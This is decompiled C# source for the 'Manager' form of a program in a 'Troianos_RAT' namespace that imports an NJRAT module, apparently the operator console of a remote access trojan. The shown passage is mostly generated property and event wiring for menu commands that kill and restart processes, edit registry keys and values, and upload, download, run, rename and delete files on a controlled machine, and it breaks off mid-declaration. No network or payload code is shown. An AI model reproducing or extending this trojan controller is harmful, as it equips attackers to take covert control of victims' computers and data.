using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x02000012 RID: 18
	[DesignerGenerated]
	public partial class Manager : Form
	{
		// Token: 0x060001B0 RID: 432 RVA: 0x001E8C8C File Offset: 0x001E708C
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Manager.__ENCList;
			lock (_ENCList)
			{
				bool flag = Manager.__ENCList.Count == Manager.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Manager.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Manager.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Manager.__ENCList[num] = Manager.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Manager.__ENCList.RemoveRange(num, Manager.__ENCList.Count - num);
					Manager.__ENCList.Capacity = Manager.__ENCList.Count;
				}
				Manager.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000089 RID: 137
		// (get) Token: 0x060001B3 RID: 435 RVA: 0x001EBCA8 File Offset: 0x001EA0A8
		// (set) Token: 0x060001B4 RID: 436 RVA: 0x001EBCC0 File Offset: 0x001EA0C0
		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		// Token: 0x1700008A RID: 138
		// (get) Token: 0x060001B5 RID: 437 RVA: 0x001EBCCC File Offset: 0x001EA0CC
		// (set) Token: 0x060001B6 RID: 438 RVA: 0x001EBCE4 File Offset: 0x001EA0E4
		internal virtual ToolStripStatusLabel SL
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SL;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SL_Click);
				bool flag = this._SL != null;
				if (flag)
				{
					this._SL.Click -= value2;
				}
				this._SL = value;
				flag = (this._SL != null);
				if (flag)
				{
					this._SL.Click += value2;
				}
			}
		}

		// Token: 0x1700008B RID: 139
		// (get) Token: 0x060001B7 RID: 439 RVA: 0x001EBD44 File Offset: 0x001EA144
		// (set) Token: 0x060001B8 RID: 440 RVA: 0x001EBD5C File Offset: 0x001EA15C
		internal virtual ToolStripProgressBar pr
		{
			[DebuggerNonUserCode]
			get
			{
				return this._pr;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._pr = value;
			}
		}

		// Token: 0x1700008C RID: 140
		// (get) Token: 0x060001B9 RID: 441 RVA: 0x001EBD68 File Offset: 0x001EA168
		// (set) Token: 0x060001BA RID: 442 RVA: 0x001EBD80 File Offset: 0x001EA180
		internal virtual ContextMenuStrip M1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._M1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._M1 = value;
			}
		}

		// Token: 0x1700008D RID: 141
		// (get) Token: 0x060001BB RID: 443 RVA: 0x001EBD8C File Offset: 0x001EA18C
		// (set) Token: 0x060001BC RID: 444 RVA: 0x001EBDA4 File Offset: 0x001EA1A4
		internal virtual ToolStripMenuItem KillToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KillToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.KillToolStripMenuItem1_Click);
				bool flag = this._KillToolStripMenuItem1 != null;
				if (flag)
				{
					this._KillToolStripMenuItem1.Click -= value2;
				}
				this._KillToolStripMenuItem1 = value;
				flag = (this._KillToolStripMenuItem1 != null);
				if (flag)
				{
					this._KillToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x1700008E RID: 142
		// (get) Token: 0x060001BD RID: 445 RVA: 0x001EBE04 File Offset: 0x001EA204
		// (set) Token: 0x060001BE RID: 446 RVA: 0x001EBE1C File Offset: 0x001EA21C
		internal virtual ToolStripMenuItem KillDeleteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KillDeleteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.KillDeleteToolStripMenuItem_Click);
				bool flag = this._KillDeleteToolStripMenuItem != null;
				if (flag)
				{
					this._KillDeleteToolStripMenuItem.Click -= value2;
				}
				this._KillDeleteToolStripMenuItem = value;
				flag = (this._KillDeleteToolStripMenuItem != null);
				if (flag)
				{
					this._KillDeleteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700008F RID: 143
		// (get) Token: 0x060001BF RID: 447 RVA: 0x001EBE7C File Offset: 0x001EA27C
		// (set) Token: 0x060001C0 RID: 448 RVA: 0x001EBE94 File Offset: 0x001EA294
		internal virtual ToolStripMenuItem RestartProcessToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RestartProcessToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RestartProcessToolStripMenuItem_Click);
				bool flag = this._RestartProcessToolStripMenuItem != null;
				if (flag)
				{
					this._RestartProcessToolStripMenuItem.Click -= value2;
				}
				this._RestartProcessToolStripMenuItem = value;
				flag = (this._RestartProcessToolStripMenuItem != null);
				if (flag)
				{
					this._RestartProcessToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000090 RID: 144
		// (get) Token: 0x060001C1 RID: 449 RVA: 0x001EBEF4 File Offset: 0x001EA2F4
		// (set) Token: 0x060001C2 RID: 450 RVA: 0x001EBF0C File Offset: 0x001EA30C
		internal virtual Timer vmethod_26
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_26;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.vmethod_26_Tick);
				bool flag = this._vmethod_26 != null;
				if (flag)
				{
					this._vmethod_26.Tick -= value2;
				}
				this._vmethod_26 = value;
				flag = (this._vmethod_26 != null);
				if (flag)
				{
					this._vmethod_26.Tick += value2;
				}
			}
		}

		// Token: 0x17000091 RID: 145
		// (get) Token: 0x060001C3 RID: 451 RVA: 0x001EBF6C File Offset: 0x001EA36C
		// (set) Token: 0x060001C4 RID: 452 RVA: 0x001EBF84 File Offset: 0x001EA384
		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		// Token: 0x17000092 RID: 146
		// (get) Token: 0x060001C5 RID: 453 RVA: 0x001EBF90 File Offset: 0x001EA390
		// (set) Token: 0x060001C6 RID: 454 RVA: 0x001EBFA8 File Offset: 0x001EA3A8
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x17000093 RID: 147
		// (get) Token: 0x060001C7 RID: 455 RVA: 0x001EBFB4 File Offset: 0x001EA3B4
		// (set) Token: 0x060001C8 RID: 456 RVA: 0x001EBFCC File Offset: 0x001EA3CC
		internal virtual ToolStripMenuItem KillConnectionToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KillConnectionToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.KillConnectionToolStripMenuItem_Click);
				bool flag = this._KillConnectionToolStripMenuItem != null;
				if (flag)
				{
					this._KillConnectionToolStripMenuItem.Click -= value2;
				}
				this._KillConnectionToolStripMenuItem = value;
				flag = (this._KillConnectionToolStripMenuItem != null);
				if (flag)
				{
					this._KillConnectionToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000094 RID: 148
		// (get) Token: 0x060001C9 RID: 457 RVA: 0x001EC02C File Offset: 0x001EA42C
		// (set) Token: 0x060001CA RID: 458 RVA: 0x001EC044 File Offset: 0x001EA444
		internal virtual ContextMenuStrip crg
		{
			[DebuggerNonUserCode]
			get
			{
				return this._crg;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._crg = value;
			}
		}

		// Token: 0x17000095 RID: 149
		// (get) Token: 0x060001CB RID: 459 RVA: 0x001EC050 File Offset: 0x001EA450
		// (set) Token: 0x060001CC RID: 460 RVA: 0x001EC068 File Offset: 0x001EA468
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				bool flag = this._RefreshToolStripMenuItem != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				flag = (this._RefreshToolStripMenuItem != null);
				if (flag)
				{
					this._RefreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000096 RID: 150
		// (get) Token: 0x060001CD RID: 461 RVA: 0x001EC0C8 File Offset: 0x001EA4C8
		// (set) Token: 0x060001CE RID: 462 RVA: 0x001EC0E0 File Offset: 0x001EA4E0
		internal virtual ToolStripMenuItem EditToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._EditToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EditToolStripMenuItem_Click);
				bool flag = this._EditToolStripMenuItem != null;
				if (flag)
				{
					this._EditToolStripMenuItem.Click -= value2;
				}
				this._EditToolStripMenuItem = value;
				flag = (this._EditToolStripMenuItem != null);
				if (flag)
				{
					this._EditToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000097 RID: 151
		// (get) Token: 0x060001CF RID: 463 RVA: 0x001EC140 File Offset: 0x001EA540
		// (set) Token: 0x060001D0 RID: 464 RVA: 0x001EC158 File Offset: 0x001EA558
		internal virtual ToolStripMenuItem NewValueToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewValueToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NewValueToolStripMenuItem_Click);
				bool flag = this._NewValueToolStripMenuItem != null;
				if (flag)
				{
					this._NewValueToolStripMenuItem.Click -= value2;
				}
				this._NewValueToolStripMenuItem = value;
				flag = (this._NewValueToolStripMenuItem != null);
				if (flag)
				{
					this._NewValueToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000098 RID: 152
		// (get) Token: 0x060001D1 RID: 465 RVA: 0x001EC1B8 File Offset: 0x001EA5B8
		// (set) Token: 0x060001D2 RID: 466 RVA: 0x001EC1D0 File Offset: 0x001EA5D0
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DeleteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem_Click);
				bool flag = this._DeleteToolStripMenuItem != null;
				if (flag)
				{
					this._DeleteToolStripMenuItem.Click -= value2;
				}
				this._DeleteToolStripMenuItem = value;
				flag = (this._DeleteToolStripMenuItem != null);
				if (flag)
				{
					this._DeleteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000099 RID: 153
		// (get) Token: 0x060001D3 RID: 467 RVA: 0x001EC230 File Offset: 0x001EA630
		// (set) Token: 0x060001D4 RID: 468 RVA: 0x001EC248 File Offset: 0x001EA648
		internal virtual ImageList rimg
		{
			[DebuggerNonUserCode]
			get
			{
				return this._rimg;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._rimg = value;
			}
		}

		// Token: 0x1700009A RID: 154
		// (get) Token: 0x060001D5 RID: 469 RVA: 0x001EC254 File Offset: 0x001EA654
		// (set) Token: 0x060001D6 RID: 470 RVA: 0x001EC26C File Offset: 0x001EA66C
		internal virtual ContextMenuStrip crgk
		{
			[DebuggerNonUserCode]
			get
			{
				return this._crgk;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._crgk = value;
			}
		}

		// Token: 0x1700009B RID: 155
		// (get) Token: 0x060001D7 RID: 471 RVA: 0x001EC278 File Offset: 0x001EA678
		// (set) Token: 0x060001D8 RID: 472 RVA: 0x001EC290 File Offset: 0x001EA690
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem1_Click);
				bool flag = this._RefreshToolStripMenuItem1 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem1.Click -= value2;
				}
				this._RefreshToolStripMenuItem1 = value;
				flag = (this._RefreshToolStripMenuItem1 != null);
				if (flag)
				{
					this._RefreshToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x1700009C RID: 156
		// (get) Token: 0x060001D9 RID: 473 RVA: 0x001EC2F0 File Offset: 0x001EA6F0
		// (set) Token: 0x060001DA RID: 474 RVA: 0x001EC308 File Offset: 0x001EA708
		internal virtual ToolStripMenuItem CreateKeyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CreateKeyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CreateKeyToolStripMenuItem_Click);
				bool flag = this._CreateKeyToolStripMenuItem != null;
				if (flag)
				{
					this._CreateKeyToolStripMenuItem.Click -= value2;
				}
				this._CreateKeyToolStripMenuItem = value;
				flag = (this._CreateKeyToolStripMenuItem != null);
				if (flag)
				{
					this._CreateKeyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700009D RID: 157
		// (get) Token: 0x060001DB RID: 475 RVA: 0x001EC368 File Offset: 0x001EA768
		// (set) Token: 0x060001DC RID: 476 RVA: 0x001EC380 File Offset: 0x001EA780
		internal virtual ToolStripMenuItem DeleteSelectedToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DeleteSelectedToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteSelectedToolStripMenuItem_Click);
				bool flag = this._DeleteSelectedToolStripMenuItem != null;
				if (flag)
				{
					this._DeleteSelectedToolStripMenuItem.Click -= value2;
				}
				this._DeleteSelectedToolStripMenuItem = value;
				flag = (this._DeleteSelectedToolStripMenuItem != null);
				if (flag)
				{
					this._DeleteSelectedToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700009E RID: 158
		// (get) Token: 0x060001DD RID: 477 RVA: 0x001EC3E0 File Offset: 0x001EA7E0
		// (set) Token: 0x060001DE RID: 478 RVA: 0x001EC3F8 File Offset: 0x001EA7F8
		internal virtual ContextMenuStrip ContextMenuStrip2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip2 = value;
			}
		}

		// Token: 0x1700009F RID: 159
		// (get) Token: 0x060001DF RID: 479 RVA: 0x001EC404 File Offset: 0x001EA804
		// (set) Token: 0x060001E0 RID: 480 RVA: 0x001EC41C File Offset: 0x001EA81C
		internal virtual ToolStripMenuItem StopToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StopToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.StopToolStripMenuItem_Click);
				bool flag = this._StopToolStripMenuItem != null;
				if (flag)
				{
					this._StopToolStripMenuItem.Click -= value2;
				}
				this._StopToolStripMenuItem = value;
				flag = (this._StopToolStripMenuItem != null);
				if (flag)
				{
					this._StopToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A0 RID: 160
		// (get) Token: 0x060001E1 RID: 481 RVA: 0x001EC47C File Offset: 0x001EA87C
		// (set) Token: 0x060001E2 RID: 482 RVA: 0x001EC494 File Offset: 0x001EA894
		internal virtual ToolStripMenuItem PauseToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PauseToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PauseToolStripMenuItem_Click);
				bool flag = this._PauseToolStripMenuItem != null;
				if (flag)
				{
					this._PauseToolStripMenuItem.Click -= value2;
				}
				this._PauseToolStripMenuItem = value;
				flag = (this._PauseToolStripMenuItem != null);
				if (flag)
				{
					this._PauseToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A1 RID: 161
		// (get) Token: 0x060001E3 RID: 483 RVA: 0x001EC4F4 File Offset: 0x001EA8F4
		// (set) Token: 0x060001E4 RID: 484 RVA: 0x001EC50C File Offset: 0x001EA90C
		internal virtual ToolStripMenuItem StartToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StartToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.StartToolStripMenuItem_Click);
				bool flag = this._StartToolStripMenuItem != null;
				if (flag)
				{
					this._StartToolStripMenuItem.Click -= value2;
				}
				this._StartToolStripMenuItem = value;
				flag = (this._StartToolStripMenuItem != null);
				if (flag)
				{
					this._StartToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A2 RID: 162
		// (get) Token: 0x060001E5 RID: 485 RVA: 0x001EC56C File Offset: 0x001EA96C
		// (set) Token: 0x060001E6 RID: 486 RVA: 0x001EC584 File Offset: 0x001EA984
		internal virtual ContextMenuStrip ContextMenuStrip3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip3 = value;
			}
		}

		// Token: 0x170000A3 RID: 163
		// (get) Token: 0x060001E7 RID: 487 RVA: 0x001EC590 File Offset: 0x001EA990
		// (set) Token: 0x060001E8 RID: 488 RVA: 0x001EC5A8 File Offset: 0x001EA9A8
		internal virtual ToolStripMenuItem UPToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UPToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UPToolStripMenuItem_Click);
				bool flag = this._UPToolStripMenuItem != null;
				if (flag)
				{
					this._UPToolStripMenuItem.Click -= value2;
				}
				this._UPToolStripMenuItem = value;
				flag = (this._UPToolStripMenuItem != null);
				if (flag)
				{
					this._UPToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A4 RID: 164
		// (get) Token: 0x060001E9 RID: 489 RVA: 0x001EC608 File Offset: 0x001EAA08
		// (set) Token: 0x060001EA RID: 490 RVA: 0x001EC620 File Offset: 0x001EAA20
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem2_Click);
				bool flag = this._RefreshToolStripMenuItem2 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem2.Click -= value2;
				}
				this._RefreshToolStripMenuItem2 = value;
				flag = (this._RefreshToolStripMenuItem2 != null);
				if (flag)
				{
					this._RefreshToolStripMenuItem2.Click += value2;
				}
			}
		}

		// Token: 0x170000A5 RID: 165
		// (get) Token: 0x060001EB RID: 491 RVA: 0x001EC680 File Offset: 0x001EAA80
		// (set) Token: 0x060001EC RID: 492 RVA: 0x001EC698 File Offset: 0x001EAA98
		internal virtual ToolStripMenuItem RunToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RunToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RunToolStripMenuItem_Click);
				bool flag = this._RunToolStripMenuItem != null;
				if (flag)
				{
					this._RunToolStripMenuItem.Click -= value2;
				}
				this._RunToolStripMenuItem = value;
				flag = (this._RunToolStripMenuItem != null);
				if (flag)
				{
					this._RunToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A6 RID: 166
		// (get) Token: 0x060001ED RID: 493 RVA: 0x001EC6F8 File Offset: 0x001EAAF8
		// (set) Token: 0x060001EE RID: 494 RVA: 0x001EC710 File Offset: 0x001EAB10
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DeleteToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem1_Click);
				bool flag = this._DeleteToolStripMenuItem1 != null;
				if (flag)
				{
					this._DeleteToolStripMenuItem1.Click -= value2;
				}
				this._DeleteToolStripMenuItem1 = value;
				flag = (this._DeleteToolStripMenuItem1 != null);
				if (flag)
				{
					this._DeleteToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000A7 RID: 167
		// (get) Token: 0x060001EF RID: 495 RVA: 0x001EC770 File Offset: 0x001EAB70
		// (set) Token: 0x060001F0 RID: 496 RVA: 0x001EC788 File Offset: 0x001EAB88
		internal virtual ToolStripMenuItem EditToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._EditToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EditToolStripMenuItem1_Click);
				bool flag = this._EditToolStripMenuItem1 != null;
				if (flag)
				{
					this._EditToolStripMenuItem1.Click -= value2;
				}
				this._EditToolStripMenuItem1 = value;
				flag = (this._EditToolStripMenuItem1 != null);
				if (flag)
				{
					this._EditToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000A8 RID: 168
		// (get) Token: 0x060001F1 RID: 497 RVA: 0x001EC7E8 File Offset: 0x001EABE8
		// (set) Token: 0x060001F2 RID: 498 RVA: 0x001EC800 File Offset: 0x001EAC00
		internal virtual ToolStripMenuItem RenameToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RenameToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RenameToolStripMenuItem_Click);
				bool flag = this._RenameToolStripMenuItem != null;
				if (flag)
				{
					this._RenameToolStripMenuItem.Click -= value2;
				}
				this._RenameToolStripMenuItem = value;
				flag = (this._RenameToolStripMenuItem != null);
				if (flag)
				{
					this._RenameToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A9 RID: 169
		// (get) Token: 0x060001F3 RID: 499 RVA: 0x001EC860 File Offset: 0x001EAC60
		// (set) Token: 0x060001F4 RID: 500 RVA: 0x001EC878 File Offset: 0x001EAC78
		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem_Click);
				bool flag = this._CopyToolStripMenuItem != null;
				if (flag)
				{
					this._CopyToolStripMenuItem.Click -= value2;
				}
				this._CopyToolStripMenuItem = value;
				flag = (this._CopyToolStripMenuItem != null);
				if (flag)
				{
					this._CopyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000AA RID: 170
		// (get) Token: 0x060001F5 RID: 501 RVA: 0x001EC8D8 File Offset: 0x001EACD8
		// (set) Token: 0x060001F6 RID: 502 RVA: 0x001EC8F0 File Offset: 0x001EACF0
		internal virtual ToolStripMenuItem CutToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CutToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CutToolStripMenuItem_Click);
				bool flag = this._CutToolStripMenuItem != null;
				if (flag)
				{
					this._CutToolStripMenuItem.Click -= value2;
				}
				this._CutToolStripMenuItem = value;
				flag = (this._CutToolStripMenuItem != null);
				if (flag)
				{
					this._CutToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000AB RID: 171
		// (get) Token: 0x060001F7 RID: 503 RVA: 0x001EC950 File Offset: 0x001EAD50
		// (set) Token: 0x060001F8 RID: 504 RVA: 0x001EC968 File Offset: 0x001EAD68
		internal virtual ToolStripMenuItem PasteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PasteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PasteToolStripMenuItem_Click);
				bool flag = this._PasteToolStripMenuItem != null;
				if (flag)
				{
					this._PasteToolStripMenuItem.Click -= value2;
				}
				this._PasteToolStripMenuItem = value;
				flag = (this._PasteToolStripMenuItem != null);
				if (flag)
				{
					this._PasteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000AC RID: 172
		// (get) Token: 0x060001F9 RID: 505 RVA: 0x001EC9C8 File Offset: 0x001EADC8
		// (set) Token: 0x060001FA RID: 506 RVA: 0x001EC9E0 File Offset: 0x001EADE0
		internal virtual ToolStripMenuItem DownloadToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DownloadToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DownloadToolStripMenuItem_Click);
				bool flag = this._DownloadToolStripMenuItem != null;
				if (flag)
				{
					this._DownloadToolStripMenuItem.Click -= value2;
				}
				this._DownloadToolStripMenuItem = value;
				flag = (this._DownloadToolStripMenuItem != null);
				if (flag)
				{
					this._DownloadToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000AD RID: 173
		// (get) Token: 0x060001FB RID: 507 RVA: 0x001ECA40 File Offset: 0x001EAE40
		// (set) Token: 0x060001FC RID: 508 RVA: 0x001ECA58 File Offset: 0x001EAE58
		internal virtual ToolStripMenuItem UploadToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UploadToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UploadToolStripMenuItem_Click);
				bool flag = this._UploadToolStripMenuItem != null;
				if (flag)
				{
					this._UploadToolStripMenuItem.Click -= value2;
				}
				this._UploadToolStripMenuItem = value;
				flag = (this._UploadToolStripMenuItem != null);
				if (flag)
				{
					this._UploadToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000AE RID: 174
		// (get) Token: 0x060001FD RID: 509 RVA: 0x001ECAB8 File Offset: 0x001EAEB8
		// (set) Token: 0x060001FE RID: 510 RVA: 0x001ECAD0 File Offset: 0x001EAED0
		internal virtual ToolStripMenuItem NewEmptyFileToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewEmptyFileToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NewEmptyFileToolStripMenuItem_Click);
				bool flag = this._NewEmptyFileToolStripMenuItem != null;
				if (flag)
				{
					this._NewEmptyFileToolStripMenuItem.Click -= value2;
				}
				this._NewEmptyFileToolStripMenuItem = value;
				flag = (this._NewEmptyFileToolStripMenuItem != null);
				if (flag)
				{
					this._NewEmptyFileToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000AF RID: 175
		// (get) Token: 0x060001FF RID: 511 RVA: 0x001ECB30 File Offset: 0x001EAF30
		// (set) Token: 0x06000200 RID: 512 RVA: 0x001ECB48 File Offset: 0x001EAF48
